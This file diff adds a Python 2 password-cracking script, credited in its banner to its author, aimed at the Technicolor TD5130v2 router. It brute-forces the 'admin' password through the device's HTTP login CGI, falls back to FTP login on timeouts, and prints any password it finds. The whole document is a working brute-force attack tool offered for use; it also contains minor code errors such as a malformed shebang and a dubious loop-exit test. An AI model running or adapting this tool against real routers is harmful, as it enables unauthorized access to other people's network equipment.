@@ -1,0 +1,104 @@
+#!usr/bin/python 
+import urllib 
+import urllib2 
+import ftplib 
+import sys 
+import telnetlib 
+M='admin' 
+h="http://192.168.1.1/cgi-bin/basicauth.cgi?index.html" 
+head={'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'} 
+ms='''---------------------------TechniCTDv3 Twizer--------------------------- 
+ Gr33Tz 2 : STH.Family       ______ 
+                         ___/_____/\  Technicolor TD5130v2 Fucker 
+                        /         /\\\  Coded By Bios.IS (8105) 
+                  _____/__       /  \\\ First Version 
+                _/       /\_____/___ \  03:40 AM 
+               //       /  \       /\ \ 20/03/2017 
+       _______//_______/    \     / _\/______ 
+      /      / \       \    /    / /        /\ 
+   __/      /   \       \  /    / /        / _\__ 
+  / /      /     \_______\/    / /        / /   /\ 
+ /_/______/___________________/ /________/ /___/  \ 
+ \ \      \    ___________    \ \        \ \   \  / 
+  \_\      \  /          /\    \ \        \ \___\/ 
+     \      \/          /  \    \ \        \  / 
+      \_____/          /    \    \ \________\/ 
+           /__________/      \    \  / My First Python Project 
+           \   _____  \      /_____\/ 
+            \ /    /\  \    /___\/  Morocan9007[AT]Gmail[DOT]Com
+             /____/  \  \  / 
+             \    \  /___\/ fb.com/profile.php?id=100014293603964
+              \____\/ 
+------------------------Cracking T00l-----------------------------------''' 
+p1=p2=p3=p4="0123456789zxcvbnasdfghjklqwertyuiop" 
+N=35 
+c1=c2=c3=c4=0 
+print ms 
+raw_input('Type Return To Start ( Enter ) .') 
+def stiktik(ma): 
+  v={'user':M,'password':ma} 
+  da=urllib.urlencode(v) 
+  req=urllib2.Request(h,da,head) 
+  res=urllib2.urlopen(req) 
+  ja=res.read() 
+  if'<script>location.href="?count='in ja: 
+    print ms 
+    print"\n[+] PassWD Founde ===> ",ma 
+    print"[+] "+M+':'+ma 
+    exit() 
+    pass 
+  elif'<script>location.href="?time='in ja: 
+    print'\nHttp - TimeOut Switch to FTP ' 
+    return True 
+    pass 
+  else: 
+    sys.stdout.write('.') 
+    return False 
+    pass 
+  pass 
+def l7lwa(kode): 
+  try: 
+    ftp=ftplib.FTP(h[7:18]) 
+    ftp.login(M,kode) 
+    print ms 
+    print"\n[+] PassWD Founde ====> ",kode 
+    print"[+] "+M+":"+kode 
+    exit() 
+    pass 
+  except Exception as e: 
+    if e[0][0:3]=="530": 
+      sys.stdout.write('.') 
+      return False 
+      pass 
+    else: 
+      print'\nFTP timeOut - Switch to http' 
+      return True 
+      pass 
+  pass 
+poz=0 
+print 'Start ...' 
+while True: 
+  if poz==0: 
+    if stiktik(p1[c1]+p2[c2]+p3[c3]+p4[c4]):poz=1 
+  elif poz==1: 
+    if l7lwa(p1[c1]+p2[c2]+p3[c3]+p4[c4]):poz=0 
+  else: 
+    print"\nDouble TimeOut " 
+    continue 
+    pass 
+  c4=c4+1 
+  if c4==N: 
+    c4=0 
+    c3=c3+1 
+    if c3==N: 
+      c3=0 
+      c2=c2+1 
+      if c2==N: 
+        c2=0 
+        c1=c1+1 
+        if c1&c2&c3&c4==N:break 
+        pass 
+      pass 
+    pass  
+  pass 
+print ms 
